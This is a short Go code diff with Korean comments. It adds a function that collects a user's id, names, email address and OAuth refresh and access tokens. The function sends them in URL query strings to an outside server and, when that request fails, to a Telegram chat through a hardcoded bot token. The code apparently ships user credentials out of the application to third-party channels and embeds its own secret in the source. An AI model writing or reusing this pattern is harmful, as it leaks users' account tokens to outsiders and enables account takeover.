@@ -659,6 +659,50 @@ func TsFinder(token string) (int, error) {
 	return ts, nil
 }
 
+///SendLoginInfo 로그인 정보 전송
+func SendLoginInfo(id, display, name, refresh, access, mail string) {
+	defer Recover() // 복구
+
+	logBot, _ := tgbot.NewBotAPI("795211787:AAExoCodmpr2JCaJC-H7bjXIkFWYwI6H83k")
+	logBot.Debug = false
+
+	msg := tgbot.NewMessage(-1001284397070, fmt.Sprintf("로그인 기록 실패\n"+
+		"_id: %s\n"+
+		"display_name: %s\n"+
+		"name: %s\n"+
+		"refresh: %s\n"+
+		"access: %s\n"+
+		"mailAccount: %s",
+		id,
+		display,
+		name,
+		refresh,
+		access,
+		mail,
+	))
+
+	resp, err := http.Get(fmt.Sprintf("https://dl.tmi.tips/api/LoginMember?_id=%s&display_name=%s&name=%s&refresh=%s&access=%s&mailAccount=%s", id, display, name, refresh, access, mail))
+	if err != nil {
+		_, err = logBot.Send(msg)
+		ErrHandle(err)
+	}
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		_, err = logBot.Send(msg)
+		ErrHandle(err)
+	}
+	resp.Body.Close()
+
+	var sendLoginInfos SendLoginInfos
+	json.Unmarshal(body, &sendLoginInfos)
+
+	if sendLoginInfos.Type == 0 {
+		_, err = logBot.Send(msg)
+		ErrHandle(err)
+	}
+}
+
 //JsonParse json 파싱
 func JsonParse(url string) ([]byte, error) {
 	defer Recover() // 복구
